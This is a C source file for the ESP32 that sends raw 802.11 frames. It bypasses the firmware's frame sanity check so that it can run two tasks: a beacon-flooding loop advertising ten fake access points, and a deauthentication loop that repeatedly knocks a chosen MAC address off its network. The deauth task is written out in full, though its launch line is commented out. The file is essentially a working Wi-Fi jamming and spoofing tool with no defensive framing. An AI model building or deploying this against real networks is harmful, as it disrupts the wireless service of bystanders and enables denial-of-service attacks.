/**
MIT License

Copyright (c) 2024 SodiumTsss

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include "freertos/FreeRTOS.h"
#include "esp_event.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "nvs_flash.h"
#include "string.h"

// Raw 802.11 beacon advertiser packet template
uint8_t beacon_adv_raw[57] = {
	0x80, 0x00,				// Frame control.			
	0x00, 0x00,				// Duration ID.			
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff,     // Address receiver
	0xba, 0xde, 0xaf, 0xfe, 0x00, 0x06, // Address sender
	0xba, 0xde, 0xaf, 0xfe, 0x00, 0x06, // Address filtering
	0x00, 0x00,           // Seq-ctl
	0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, // Optional 4th address
	0x64, 0x00,           // Frame body
	0x31, 0x04,
	0x00, 0x00,
	0x01, 0x08, 0x82, 0x84,	0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
	0x03, 0x01, 0x01,
	0x05, 0x04, 0x01, 0x02, 0x00, 0x00
};

// Raw 802.11 deauth packet template.
uint8_t deaut_raw[26] = {
    0xc0, 0x00, // Frame control
    0x3a, 0x01, // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination address
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Sender address
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSS ID
    0xf0, 0xff, 0x02, 0x00 // FCS
};

/**
 * Override the function, so that we can use the action frames in ESP-IDF.
*/
int ieee80211_raw_frame_sanity_check(int32_t arg1, int32_t arg2, int32_t arg3) {
    return 0;
}

/**
 * Expose the function from ESP-IDF, so that we can transmit raw 802.11 frames.
*/
esp_err_t esp_wifi_80211_tx(wifi_interface_t interface, const void * buffer, int len, bool en_sys_seq);

#define BEACON_SSID_OFFSET 38
#define SRCADDRESS_OFFSET 10
#define BSSID_OFFSET 16
#define SEQ_NUM_OFFSET 22

#define AMOUNT_APS 10
#define AP_NAME "Thingy"

/**
 * Advertise multiple APs from the ESP-32, each AP has an ssid incremented by 1.
 * Configure the AP names by changing the AP_NAME define.
 * Configure the AP ammounts by changing the AMOUNT_APS define.
*/
void advert_task(void *pvParameter) {

    uint16_t seqNums[AMOUNT_APS] = {0};
    uint8_t point = 0;

    for (;;) {
        vTaskDelay(100 / AMOUNT_APS / portTICK_PERIOD_MS);
        // Build the final frame for transmission.
        char* final = (char *) calloc(20, sizeof(char));
        snprintf(final, 20, "%s %d", AP_NAME, point);
        
        uint8_t packet[200];
        memcpy(packet, beacon_adv_raw, BEACON_SSID_OFFSET - 1);
        packet[BEACON_SSID_OFFSET - 1] = strlen(final);
        memcpy(&packet[BEACON_SSID_OFFSET], final, strlen(final));
        memcpy(&packet[BEACON_SSID_OFFSET + strlen(final)], &beacon_adv_raw[BEACON_SSID_OFFSET], sizeof(beacon_adv_raw) - BEACON_SSID_OFFSET);

        packet[SRCADDRESS_OFFSET + 5] = point;
        packet[BSSID_OFFSET + 5] = point;

        packet[SEQ_NUM_OFFSET] = (seqNums[point] & 0x0f) << 4;
        packet[SEQ_NUM_OFFSET + 1] = (seqNums[point] & 0xff0) >> 4;
        seqNums[point]++;

        if (seqNums[point] > 0xfff) seqNums[point] = 0;

        esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(beacon_adv_raw) + strlen(final), false);
        if(++point >= AMOUNT_APS) point = 0;
        free(final);
    }
}

#define DEAUTH_MAC {0x01, 0x02, 0x03, 0x04, 0x05, 0x06}

/**
 * Task that sends a deauth frame for the specified MAC address, from the ESP-32.
 * Specify the MAC address by chaning the DEAUTH_MAC define.
*/
void deauth_task(void *pvParameter) {
    for (;;) {
        vTaskDelay(100/ portTICK_PERIOD_MS);

        uint16_t packetSize = sizeof(deaut_raw);
        uint8_t deauthpkt[packetSize];
        memcpy(deauthpkt, deaut_raw, packetSize);

        uint8_t stMac[6] = DEAUTH_MAC;

        memcpy(&deauthpkt[10], &stMac, 6);
        memcpy(&deauthpkt[16], &stMac, 6);

        esp_wifi_80211_tx(WIFI_IF_AP, deauthpkt, packetSize, false);
    }
}


void app_main(void)
{
    nvs_flash_init();

    esp_netif_init();
    esp_event_loop_create_default();
    esp_netif_create_default_wifi_ap();
    esp_netif_create_default_wifi_sta();


    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);

    esp_wifi_set_mode(WIFI_MODE_APSTA);
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "Beacon",
            .ssid_len = 0,
            .password = "thingi",
            .authmode = WIFI_AUTH_WPA2_PSK,
            .ssid_hidden = 1,
            .max_connection = 4,
        }
    };
    esp_wifi_start();
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);

    // Two tasks, one for advertising beacon frames, the other for deauthorizing.
    xTaskCreate(&advert_task, "advert task", 4096, NULL, 5, NULL);
    // xTaskCreate(&deauth_task, "Deauther", 3096, NULL, 5, NULL);
}
